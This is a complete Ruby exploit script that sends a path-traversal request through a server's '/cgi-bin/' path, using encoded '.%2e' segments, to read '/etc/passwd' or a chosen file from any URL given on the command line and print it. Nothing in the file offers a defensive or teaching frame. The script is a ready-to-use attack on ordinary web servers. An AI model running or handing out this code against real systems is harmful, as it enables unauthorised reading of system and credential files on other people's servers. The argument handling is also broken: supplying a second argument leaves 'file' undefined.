#!/usr/bin/ruby

require 'uri'
require 'net/http'

url = ARGV[0]

if ARGV[0].nil?
	exit 0
end

if ARGV[1].nil?
  file = '/etc/passwd'
end

def scanner(url, file)
  path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/#{file}"
  uri = URI("#{url}#{path}")
  res = Net::HTTP.get_response(uri)
  puts res.body if res.is_a?(Net::HTTPSuccess)
end

scanner(url, file)
